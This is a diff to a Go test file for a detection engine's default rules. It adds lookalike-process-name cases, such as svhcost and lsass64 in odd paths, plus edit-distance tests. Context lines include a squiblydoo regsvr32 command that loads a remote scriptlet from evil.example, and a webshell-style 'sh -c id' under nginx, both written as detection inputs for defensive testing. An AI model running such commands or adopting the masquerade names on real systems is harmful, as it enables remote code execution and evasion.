@@ -60,6 +60,17 @@ func TestDefaultRules(t *testing.T) {
 		{"plain powershell", proc("powershell.exe", "", "powershell.exe -File build.ps1", "explorer.exe"), nil},
 		{"squiblydoo", proc("regsvr32.exe", "", `regsvr32 /s /n /u /i:http://evil.example/x.sct scrobj.dll`, "cmd.exe"), []string{"PT-W009"}},
 		{"linux webshell", proc("sh", "/usr/bin/dash", "sh -c id", "nginx"), []string{"PT-L001"}},
+		{"swapped letters svhcost", proc("svhcost.exe", `C:\Users\Public\x\svhcost.exe`, "", "explorer.exe"), []string{"PT-W005", "PT-W013"}},
+		{"missing letter svhost", proc("svhost.exe", `D:\svhost.exe`, "", "explorer.exe"), []string{"PT-W005"}},
+		{"real sihost is not a lookalike (seen on Windows 11)",
+			withOriginal(proc("sihost.exe", sys+"sihost.exe", "sihost.exe", "svchost.exe"), "sihost.exe"), nil},
+		{"real LsaIso is not a lookalike (seen on Windows 11)", proc("LsaIso.exe", "", "", "wininit.exe"), nil},
+		{"two edits scvhst in Temp", proc("scvhst.exe", `C:\Users\bob\AppData\Local\Temp\scvhst.exe`, "", "explorer.exe"), []string{"PT-W015", "PT-W013"}},
+		{"two edits lsass64 on D:", proc("lsass64.exe", `D:\tools\lsass64.exe`, "", "explorer.exe"), []string{"PT-W015"}},
+		{"real sihost copied to Temp", proc("sihost.exe", `C:\Users\bob\AppData\Local\Temp\sihost.exe`, "", "explorer.exe"), []string{"PT-W015", "PT-W013"}},
+		{"real iexplore is not a lookalike", proc("iexplore.exe", `C:\Program Files\Internet Explorer\iexplore.exe`, "", "explorer.exe"), nil},
+		{"real taskhost in System32 (Windows 7)", proc("taskhost.exe", sys+"taskhost.exe", "", "services.exe"), nil},
+		{"taskhost outside System32", proc("taskhost.exe", `D:\taskhost.exe`, "", "explorer.exe"), []string{"PT-W005"}},
 		{"real explorer is not a lookalike", proc("explorer.exe", `C:\Windows\explorer.exe`, "", "userinit.exe"), nil},
 
 		// Evasion cases fixed in v0.2.
@@ -96,6 +107,25 @@ func TestDefaultRules(t *testing.T) {
 				t.Fatalf("score %d for clean process", score)
 			}
 		})
+	}
+}
+
+func TestEditDistance(t *testing.T) {
+	cases := []struct {
+		a, b string
+		want int
+	}{
+		{"scvhost.exe", "svchost.exe", 1}, // adjacent swap counts once
+		{"svhost.exe", "svchost.exe", 1},
+		{"sihost.exe", "svchost.exe", 2},
+		{"lsaiso.exe", "lsass.exe", 2},
+		{"lsass .exe", "lsass.exe", 1},
+		{"abc", "abc", 0},
+	}
+	for _, c := range cases {
+		if got := editDistance(c.a, c.b); got != c.want {
+			t.Errorf("editDistance(%q, %q) = %d, want %d", c.a, c.b, got, c.want)
+		}
 	}
 }
 
@@ -159,6 +189,12 @@ func TestRiskScore(t *testing.T) {
 	dets, score := e.Evaluate(event.Process{Name: "X.EXE"})
 	if dets[0].RuleID != "c" || score != 100 {
 		t.Fatalf("top=%s score=%d, want c / 100", dets[0].RuleID, score)
+	}
+}
+
+func TestLookalikeEditsValidated(t *testing.T) {
+	if _, err := New([]Rule{{ID: "x", Match: Match{NameLookalike: []string{"a.exe"}, LookalikeEdits: 3}}}); err == nil {
+		t.Fatal("name_lookalike_edits 3 accepted")
 	}
 }
 
